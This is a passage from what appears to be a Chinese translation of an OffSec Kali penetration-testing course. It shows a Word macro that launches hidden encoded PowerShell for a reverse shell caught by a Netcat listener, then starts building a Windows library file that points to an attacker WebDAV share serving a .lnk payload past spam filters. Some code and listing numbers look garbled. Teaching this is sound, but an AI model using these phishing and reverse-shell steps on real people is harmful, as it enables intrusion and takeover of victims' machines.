
进入`/path/to/xxx`目录，找到`xxx.json`。

在表达式`cvar = avar + bvar`中，加法运算符（`+`）将`avar`与`bvar`相加，得到它们的和`cvar`

在`List.of(arg0, arg1, arg2)`中，`List`接口的工厂方法`of()`接受一系列的元素，返回包含它们的只读列表。

之后我们这样调用`cmd`命令：`cmd arg0 arg1 arg2`。

```
if (condVar > someVal) {console.log("xxx")}
```

`Str = Str + "powershell.exe -nop -w hidden -e SQBFAGAKABOAGU"`

`Str = Str + "AdwataAEAY8gBQQUAYwB0ACAUwB5AHADABLAG0ALgBOGUAD"`

`Str = Str + "AAuFaCa2QB1AEbAbBpBQQUAGbB0GAClBEGA8AdwBuAgAbwb"`

```
> Str = Str + "QJCAQAMASADJCAAYXADYoAAAUADEAMQ4ACAC4MgAgAc0CAAA"
Str = Str + "GDQANNAAA0ADIAATATAGUIAIwBg8AdwBLAHIAcWBOAGUAbSBS"
```

`CreateObject("Script.Shell").Run Str`

`End Sub`

```
列表 218 - 调用 PowerShell 创建反向 shell
```

修改宏后，保存并关闭文档。在重新打开它之前，我们在 PowerCat 脚本所在的目录中启动一个 Python3 服务器。我们还将在端口 4444 上启动一个 Netcat 监听器。

双击文档后，宏会自动执行。注意宏正在执行，我们收到了 Netcat 监听器。

```
kali@kali: $ nc -nvlp 4444
```

列表 219 - 来自宏的反向 shell

# OffSec

使用 Kali Linux 进行渗透测试

阶段，我们使用立足点提供一个可执行文件，双击后即可启动反弹 shell。

首先，我们将创建一个连接到 WebDAV 的库文件。在第一阶段，受害者会接收到一个 `.library` 文件。当他们双击该文件时，它会在 资源管理器中作为一个目录显示。在 WebDAV 目录中，我们将提供一个 `.lnk` 格式的载荷用于第二阶段执行。

乍一看，我们可能通过像 Apache 这样的服务器提供 `.lnk` 文件来实现目标。缺点是我们需要向受害者提供 `.lnk` 载荷。大多数垃圾过滤器和安全技术会分析链接的可执行文件类型。这意味着我们的链接在到达受害者之前会被过滤。

另一方面，大多数垃圾过滤器和安全技术会让库文件直接通过。当他们双击文件时，Windows资源管理器会显示远程位置的内容。在这种情况下，远程位置是我们攻击机器上的 WebDAV 共享。总的来说，这是一个非常直接的过程，看起来就像受害者双击了一个本地文件。

为了演示这一点，我们将在 Kali 系统上设置 WebDAV。我们将使用 `wsgdav` 作为 WebDAV 服务器来托管并提供文件。我们可以使用 `pip3` 安装 `wsgdav`。

```bash
kali@kali:~ pip3 install wsgdav

Defaulting to user because site-packages are not writable

Collecting wsgdav-4.0.1-py3-none-any.whl (171.3 KB)

  Downloading 171.3 KB 6 MB/s 00:00

Successfully installed wsgdav-4.0.1
```
列表 225 - 安装 pip3 和 wsgdav

一旦 `wsgdav` 安装完成，我们将使用 `/home/webdav` 目录作为 WebDAV 共享，其中包含我们的 `.lnk` 文件。现在，在该目录下放置一个测试文件。

如果 `wsgdav` 安装时遇到 `externally-managed-environment` 错误，你可以在命令中添加 `--break-system-packages`。PEP 668 引入了使用虚拟环境来防止 pip 安装。

接下来，我们将从 `/home/kali/local/bin` 运行 `wsgdav`。第一个参数是 `-host`，用于指定主机。我们将监听所有接口 `0.0.0.0`。接下来，我们将使用 `--port=80` 指定监听端口，并使用 `auth=anonymous` 禁用共享认证。最后，我们创建 `/home/kali/webdav` 目录。

```bash
kali@kali:-$ mkdir /home/kali/webdav
```

```bash
kali@kali:-$ /home/kali/local/bin/wsgdav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav
```

```text
Running without configuration.

17:41:53.917 WARNING - App wsgdav.Cors(None).is_disabled returned True: skipping CORS

17:41:53.917 INFO - WsgDAV/4.0.1 Python/3.9.10 Linux-5.15.0-kali3-x86_64-with-glibc

17:41:53.919 INFO - Lock manager: LockManager(Storage)

17:41:53.919 INFO - Property manager: SimpleAuthController

17:41:53.919 INFO - Registered DAV providers by route:

17:41:53.919 INFO - /dir_browser/: FilesystemProvider for path '/home/kali/local/python3.9/site-packages/wsgdav/dir_browser/htdocs' (Read-Only) (anonymous)

17:41:53.919 INFO - '/': FilesystemProvider for path '/home/kali/webdav' (Read-Write) (anonymous)

17:41:53.920 WARNING - Basic authentication is enabled: It is highly recommended to enable SSL.

17:41:53.920 WARNING - Share '/dir_browser/' will allow write access.

17:41:53.920 WARNING - Share '/' will allow read access.

17:41:54.348 INFO - Running WsgDAV/4.0.1 Python 3.9.10 root/

17:41:54.348 INFO - Serving on http://0.0.0.0:80
```
列表 221 - 在端口 80 上启动 WebDAV

输出表明 WebDAV 共享现在运行在端口 80 上。让我们在浏览器中打开 `http://127.0.0.1/` 来确认这一点。

![](img/336dea891e746f18ad644261ced_339_0.png)
图 188 - WebDAV 共享的内容

显示我们可以成功浏览到 WebDAV 共享并查看 `test.txt`。接下来，检查 Windows 库文件。我们将使用 `rdp` 连接到 `192.168.50.194` 机器以执行攻击。我们可以使用 `offsec` 作为用户名、`lab` 作为密码连接到系统。这将使我们更容易构建库文件。

连接后，我们将在桌面上找到 Code 应用，用它来创建库文件。我们应该注意，也可以使用记事本创建文件。通过双击图标来打开它。

![](img/336dea891e746f18ad644261ced_340_0.png)
图 189 - Windows 桌面

在菜单栏中，我们点击文件 > 新建文本文件。然后我们将空文件保存为 `library-ms` 到 `offsec` 用户的桌面。一旦我们保存具有此扩展名的文件，它就会显示图标。虽然图标看起来并不危险，但它是 Windows 经常使用的，可能会引起怀疑。为了确保受害者执行我们的文件，让我们更改它的外观。

![](img/336dea891e746f18ad644261ced_340_1.png)
图 190 - 空库文件

库文件由三个主要部分组成并用 XML 编写，以指定访问远程位置的参数。这些部分是通用库信息、库属性和库位置。让我们通过添加标签来构建 XML 代码。

## Schema

库描述的进一步信息。我们将从添加库文件的版本开始。下面的列表包含了库文件的命名空间。列表还包含了库描述的结束标签。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
</libraryDescription>
```
